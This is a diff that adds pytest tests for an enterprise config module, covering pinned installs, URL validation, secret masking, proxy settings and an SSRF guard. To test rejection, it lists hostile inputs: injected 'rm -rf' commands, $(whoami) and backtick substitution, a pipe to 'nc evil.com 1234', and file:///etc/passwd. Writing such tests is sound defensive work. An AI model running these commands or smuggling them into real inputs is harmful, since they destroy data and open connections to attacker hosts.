@@ -415,12 +415,18 @@ class TestUrlOverrides:
 
         assert claude_installer_url() == "https://mirror.example.com/claude-install.sh"
 
-    def test_hermes_pip_default(self):
-        from enterprise_config import hermes_pip_url
+    def test_hermes_pip_default_is_sha_pinned(self):
+        """Default Hermes install spec must include an @<sha> pin (F-06)."""
+        from enterprise_config import DEFAULT_HERMES_PIN_SHA, hermes_pip_url
 
-        assert hermes_pip_url() == (
-            "hermes-agent @ git+https://github.com/NousResearch/hermes-agent.git"
-        )
+        spec = hermes_pip_url()
+        # Must reference the NousResearch upstream
+        assert "git+https://github.com/NousResearch/hermes-agent.git" in spec
+        # Must include the pinned SHA — bare HEAD installs are forbidden
+        assert f"@{DEFAULT_HERMES_PIN_SHA}" in spec
+        # SHA shape is a full 40-char hex string
+        assert len(DEFAULT_HERMES_PIN_SHA) == 40
+        assert all(c in "0123456789abcdef" for c in DEFAULT_HERMES_PIN_SHA)
 
     def test_hermes_pip_override(self, monkeypatch):
         monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.2.3")
@@ -658,3 +664,254 @@ class TestShellExport:
         lines = shell_export_lines()
         # Standard shell-escape pattern: close, escape, reopen
         assert any("o'\\''malley" in line for line in lines)
+
+
+# ---------------------------------------------------------------------------
+# 14. URL safety validation (F-02, F-03)
+# ---------------------------------------------------------------------------
+
+
+class TestUrlValidation:
+    """Operator-supplied URLs must reject shell metacharacters before
+    flowing into curl/eval contexts."""
+
+    def test_safe_https_url_passes(self):
+        from enterprise_config import _validate_url
+
+        assert _validate_url(
+            "CLAUDE_INSTALLER_URL", "https://mirror.example.com/claude-install.sh"
+        ) == "https://mirror.example.com/claude-install.sh"
+
+    def test_http_url_passes(self):
+        from enterprise_config import _validate_url
+
+        assert _validate_url(
+            "GITHUB_RELEASE_MIRROR", "http://internal-mirror.local:8080/path"
+        ) == "http://internal-mirror.local:8080/path"
+
+    @pytest.mark.parametrize("dangerous", [
+        "https://evil.com/'; rm -rf ~; echo '",   # single-quote bypass (F-02)
+        "https://evil.com/$(whoami)",              # command substitution
+        "https://evil.com/`whoami`",               # backtick substitution
+        "https://evil.com/path with space",        # whitespace
+        "https://evil.com/path|nc evil.com 1234",  # pipe
+        "https://evil.com/path;ls",                # semicolon
+        "javascript:alert(1)",                     # non-http(s) scheme
+        "file:///etc/passwd",                      # local-file SSRF
+        "https://evil.com/\nGET /etc/passwd",      # newline injection
+    ])
+    def test_unsafe_urls_rejected(self, dangerous):
+        from enterprise_config import _validate_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            _validate_url("TEST_VAR", dangerous)
+
+    def test_claude_installer_url_validates(self, monkeypatch):
+        """claude_installer_url() must reject shell-injection attempts."""
+        monkeypatch.setenv("CLAUDE_INSTALLER_URL", "https://evil.com/'; rm -rf ~; echo '")
+        from enterprise_config import claude_installer_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            claude_installer_url()
+
+    def test_hermes_pip_url_validates_spec_shape(self, monkeypatch):
+        """hermes_pip_url() must reject shell-injection attempts in pip specs."""
+        monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.0; rm -rf /")
+        from enterprise_config import hermes_pip_url, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            hermes_pip_url()
+
+    def test_hermes_pip_url_accepts_pinned_pypi_spec(self, monkeypatch):
+        monkeypatch.setenv("HERMES_PIP_URL", "hermes-agent==1.2.3")
+        from enterprise_config import hermes_pip_url
+
+        assert hermes_pip_url() == "hermes-agent==1.2.3"
+
+    def test_hermes_pip_url_accepts_sha_pinned_git(self, monkeypatch):
+        monkeypatch.setenv(
+            "HERMES_PIP_URL",
+            "hermes-agent @ git+https://internal/hermes.git@abc123",
+        )
+        from enterprise_config import hermes_pip_url
+
+        assert "@abc123" in hermes_pip_url()
+
+    def test_validate_mirror_env_fails_loud(self, monkeypatch):
+        """bootstrap() should refuse to start if any operator URL is unsafe."""
+        monkeypatch.setenv("GITHUB_API_BASE", "https://evil.com/`whoami`")
+        from enterprise_config import validate_mirror_env, UnsafeUrlError
+
+        with pytest.raises(UnsafeUrlError):
+            validate_mirror_env()
+
+    def test_validate_mirror_env_noop_when_unset(self):
+        """No env vars set = no validation work, no exceptions."""
+        from enterprise_config import validate_mirror_env
+
+        validate_mirror_env()  # must not raise
+
+
+# ---------------------------------------------------------------------------
+# 15. Secret masking for UV_INDEX_* and derived npm auth keys (F-08, F-11)
+# ---------------------------------------------------------------------------
+
+
+class TestSecretMasking:
+    def test_uv_index_password_is_masked(self, monkeypatch):
+        monkeypatch.setenv("UV_INDEX_INTERNAL_PASSWORD", "s3cretp4ss")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "s3cretp4ss" not in out
+        assert "UV_INDEX_INTERNAL_PASSWORD=***" in out
+
+    def test_uv_index_username_is_masked(self, monkeypatch):
+        """Usernames too — they identify the service account, useful to attackers."""
+        monkeypatch.setenv("UV_INDEX_INTERNAL_USERNAME", "svc-coda")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "svc-coda" not in out
+        assert "UV_INDEX_INTERNAL_USERNAME=***" in out
+
+    def test_npm_config_auth_token_masked(self, monkeypatch):
+        monkeypatch.setenv("npm_config_//jfrog.example.com/:_authToken", "tok-xyz")
+        from enterprise_config import startup_banner
+
+        out = startup_banner()
+        assert "tok-xyz" not in out
+
+    def test_is_secret_var_helper(self):
+        from enterprise_config import _is_secret_var
+
+        assert _is_secret_var("NPM_TOKEN")
+        assert _is_secret_var("UV_INDEX_INTERNAL_PASSWORD")
+        assert _is_secret_var("UV_INDEX_ANY_NAME_PASSWORD")
+        assert _is_secret_var("UV_INDEX_X_USERNAME")
+        assert _is_secret_var("npm_config_//host.example.com/:_authToken")
+        assert not _is_secret_var("UV_DEFAULT_INDEX")
+        assert not _is_secret_var("HTTPS_PROXY")
+        assert not _is_secret_var("npm_config_registry")
+
+
+# ---------------------------------------------------------------------------
+# 16. NO_PROXY auto-injection for DATABRICKS_HOST (F-07)
+# ---------------------------------------------------------------------------
+
+
+class TestNoProxyAutoInject:
+    def test_no_inject_when_https_proxy_unset(self, monkeypatch):
+        """If HTTPS_PROXY is unset, NO_PROXY isn't touched."""
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "NO_PROXY" not in env  # no proxy → no auto-injection
+
+    def test_inject_when_https_proxy_set(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "adb-1234.azuredatabricks.net" in env["NO_PROXY"]
+
+    def test_preserves_existing_no_proxy_entries(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        monkeypatch.setenv("NO_PROXY", "localhost,127.0.0.1")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "localhost" in env["NO_PROXY"]
+        assert "127.0.0.1" in env["NO_PROXY"]
+        assert "adb-1234.azuredatabricks.net" in env["NO_PROXY"]
+
+    def test_skip_when_host_already_in_no_proxy(self, monkeypatch):
+        """If operator already added the host (via wildcard or exact), don't duplicate."""
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        monkeypatch.setenv("NO_PROXY", ".azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        # Should still match (host is already covered by wildcard), no duplicate
+        assert env["NO_PROXY"].count("azuredatabricks.net") == 1
+
+    def test_lowercase_no_proxy_mirrored(self, monkeypatch):
+        monkeypatch.setenv("HTTPS_PROXY", "http://proxy:3128")
+        monkeypatch.setenv("DATABRICKS_HOST", "https://adb-1234.azuredatabricks.net")
+        from enterprise_config import proxy_env
+
+        env = proxy_env()
+        assert "adb-1234.azuredatabricks.net" in env["no_proxy"]
+
+
+# ---------------------------------------------------------------------------
+# 17. npm_config_registry / NPM_REGISTRY unification (F-10)
+# ---------------------------------------------------------------------------
+
+
+class TestNpmRegistryResolution:
+    def test_npm_registry_alone(self, monkeypatch):
+        """NPM_REGISTRY alone resolves to that value."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
+        from enterprise_config import _effective_npm_registry, npm_env
+
+        assert _effective_npm_registry() == "https://jfrog.example.com/npm/"
+        assert npm_env()["npm_config_registry"] == "https://jfrog.example.com/npm/"
+
+    def test_npm_config_registry_wins_over_NPM_REGISTRY(self, monkeypatch):
+        """If both are set, npm_config_registry (npm-native) wins."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
+        monkeypatch.setenv("npm_config_registry", "https://override.example.com/npm/")
+        from enterprise_config import _effective_npm_registry, npm_env
+
+        assert _effective_npm_registry() == "https://override.example.com/npm/"
+        # And npm_env returns the same — no split between env and .npmrc
+        assert npm_env()["npm_config_registry"] == "https://override.example.com/npm/"
+
+    def test_npmrc_uses_same_resolution(self, tmp_path, monkeypatch):
+        """write_npmrc() must use the same effective-registry logic as npm_env()."""
+        monkeypatch.setenv("NPM_REGISTRY", "https://jfrog.example.com/npm/")
+        monkeypatch.setenv("npm_config_registry", "https://override.example.com/npm/")
+        from enterprise_config import write_npmrc
+
+        path = write_npmrc(tmp_path)
+        content = path.read_text()
+        # The override wins — .npmrc shows the override, not the original NPM_REGISTRY
+        assert "registry=https://override.example.com/npm/" in content
+        assert "jfrog.example.com" not in content
+
+
+# ---------------------------------------------------------------------------
+# 18. doctor SSRF guard — http(s) scheme allow-list (F-11)
+# ---------------------------------------------------------------------------
+
+
+class TestDoctorSSRFGuard:
+    def test_file_scheme_filtered_out(self, monkeypatch):
+        monkeypatch.setenv("CLAUDE_INSTALLER_URL", "file:///etc/passwd")
+        from enterprise_config import doctor_targets
+
+        # _validate_url already rejects file:// at bootstrap, but doctor_targets
+        # is a second layer of defense. If somehow file:// got past, doctor
+        # must not probe it.
+        targets = dict(doctor_targets())
+        assert "CLAUDE_INSTALLER_URL" not in targets
+
+    def test_https_scheme_included(self, monkeypatch):
+        monkeypatch.setenv("NPM_REGISTRY", "https://internal/npm/")
+        from enterprise_config import doctor_targets
+
+        targets = dict(doctor_targets())
+        assert targets["NPM_REGISTRY"] == "https://internal/npm/"
+
+    def test_http_scheme_included(self, monkeypatch):
+        """Plain HTTP is allowed (some internal mirrors are HTTP-only)."""
+        monkeypatch.setenv("NPM_REGISTRY", "http://internal-mirror/npm/")
+        from enterprise_config import doctor_targets
+
+        targets = dict(doctor_targets())
+        assert targets["NPM_REGISTRY"] == "http://internal-mirror/npm/"
